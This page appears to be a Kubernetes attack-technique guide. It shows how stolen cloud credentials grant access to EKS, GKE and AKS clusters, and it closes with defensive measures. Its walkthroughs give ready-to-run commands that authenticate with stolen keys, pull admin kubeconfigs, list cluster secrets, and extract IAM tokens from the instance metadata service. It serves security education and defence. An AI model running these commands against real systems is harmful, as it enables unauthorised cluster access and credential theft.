# Using Cloud Credentials

Stolen cloud provider credentials are often enough to authenticate directly to a managed Kubernetes cluster — no cluster-specific secrets required.

> **Note:** This technique requires a cloud-managed Kubernetes cluster and cannot be fully demonstrated on a local Kind cluster.

## Description

If attackers get access to cloud credentials, they can use them to access the cluster. Managed Kubernetes services (AKS, EKS, GKE) integrate with their respective cloud IAM systems. A user or service principal with the appropriate IAM role can generate a short-lived cluster credential on demand using cloud CLI tools. This means that compromising a cloud identity — through phishing, credential stuffing, a leaked `.env` file, exposed CI/CD secrets, or a misconfigured instance metadata endpoint — is sufficient to gain Kubernetes access without ever touching a kubeconfig file stored on disk.

Common cloud identity sources attackers target:

- AWS IAM user access keys (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) found in source code, CI logs, or S3 buckets.
- GCP service account JSON key files committed to repositories or stored in misconfigured GCS buckets.
- Azure service principal client secrets stored in pipeline environment variables or Azure Key Vault with over-permissive access policies.
- Instance metadata credentials available from within a compromised pod via the Instance Metadata Service (IMDS) endpoint (`169.254.169.254`).

## Attack Walkthrough

### AWS EKS

**1. Verify the stolen credentials work**

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

aws sts get-caller-identity
```

Expected output:

```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/ci-deploy"
}
```

**2. Discover EKS clusters in the account**

```bash
aws eks list-clusters --region us-east-1
```

**3. Generate cluster credentials**

```bash
aws eks update-kubeconfig \
  --name TARGET_CLUSTER_NAME \
  --region us-east-1

# Or generate a raw token without modifying ~/.kube/config
aws eks get-token --cluster-name TARGET_CLUSTER_NAME --region us-east-1
```

**4. Access the cluster**

```bash
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
```

The level of access is determined by the IAM principal's entry in the `aws-auth` ConfigMap or EKS Access Entry.

---

### GCP GKE

**1. Authenticate with the stolen service account key**

```bash
gcloud auth activate-service-account \
  --key-file=stolen-sa-key.json

gcloud config set project TARGET_PROJECT_ID
```

**2. Discover GKE clusters in the project**

```bash
gcloud container clusters list
```

**3. Generate cluster credentials**

```bash
gcloud container clusters get-credentials TARGET_CLUSTER_NAME \
  --zone us-central1-a \
  --project TARGET_PROJECT_ID
```

**4. Access the cluster**

```bash
kubectl get namespaces
kubectl get pods --all-namespaces
```

GKE uses Google Groups and IAM for RBAC. A service account with the `roles/container.developer` or `roles/container.admin` IAM role has broad access.

---

### Azure AKS

**1. Authenticate with the stolen service principal**

```bash
az login \
  --service-principal \
  --username APP_ID \
  --password CLIENT_SECRET \
  --tenant TENANT_ID
```

**2. Discover AKS clusters in the subscription**

```bash
az aks list --output table
```

**3. Generate cluster credentials**

```bash
# Standard credentials (requires cluster RBAC permissions)
az aks get-credentials \
  --resource-group TARGET_RESOURCE_GROUP \
  --name TARGET_CLUSTER_NAME

# Admin credentials (bypasses AAD RBAC, requires Owner/Contributor on the cluster resource)
az aks get-credentials \
  --resource-group TARGET_RESOURCE_GROUP \
  --name TARGET_CLUSTER_NAME \
  --admin
```

**4. Access the cluster**

```bash
kubectl get namespaces
kubectl get pods --all-namespaces
```

AKS can use Azure AD for authentication. A user or service principal with the `Azure Kubernetes Service Cluster Admin Role` or `Azure Kubernetes Service Cluster User Role` IAM role can authenticate.

---

### Stealing credentials from the Instance Metadata Service

If an attacker has code execution inside a pod (via RCE or a compromised image), they can query the cloud provider's Instance Metadata Service to obtain temporary IAM credentials without any prior knowledge:

```bash
# AWS: retrieve instance role credentials from IMDS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
# Returns: AccessKeyId, SecretAccessKey, Token

# GCP: retrieve service account credentials from metadata server
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure: retrieve managed identity token from IMDS
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

These temporary credentials can then be used in steps 2-4 above to authenticate to the managed cluster.

## Defenses

- **Enforce IMDSv2** on AWS EC2 nodes (requires a session-oriented token, blocking simple `curl` attacks).
- **Restrict pod-level IMDS access** using network policies or node-level firewall rules.
- **Rotate and audit IAM credentials** regularly; disable unused service account keys.
- **Apply least privilege** to cloud identities used for cluster operations.
- **Enable cloud audit logs** (CloudTrail, GCP Audit Logs, Azure Monitor) and alert on `GetToken` / `get-credentials` calls from unexpected principals.
- **Use Workload Identity** (GKE), **IRSA** (EKS), or **Azure AD Workload Identity** instead of node-level instance role credentials.

## Resources

- [AKS - Azure AD Integration](https://learn.microsoft.com/en-us/azure/aks/managed-aad)
- [EKS: Grant IAM Users Access to Kubernetes](https://docs.aws.amazon.com/eks/latest/userguide/grant-k8s-access.html)
- [GKE: Authenticating to the Cluster](https://cloud.google.com/kubernetes-engine/docs/how-to/cluster-access-for-kubectl)
- [MITRE ATT&CK: Valid Accounts - Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
- [AWS IMDSv2 Migration Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html)
- [GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
